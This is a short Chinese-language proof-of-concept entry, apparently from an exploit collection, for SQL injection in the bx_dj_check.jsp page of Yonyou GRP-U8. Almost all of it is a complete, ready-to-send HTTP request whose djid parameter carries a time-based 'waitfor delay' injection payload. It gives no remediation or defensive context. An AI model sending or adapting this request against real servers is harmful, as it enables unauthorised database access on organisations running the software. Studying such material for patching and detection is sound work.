## 用友GRP-U8-bx_dj_check.jsp存在SQL注入

## poc 
```
GET /u8qx/bx_dj_check.jsp?djlxdm=OER&djid=1';waitfor+delay+'0:0:3'-- HTTP/1.1
Host: 
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_fd4ca40261bc424e2d120b806d985a14=1677835116; JSESSIONID=881972DA273F6E95D532FE7B5E5C488F
Connection: close
```
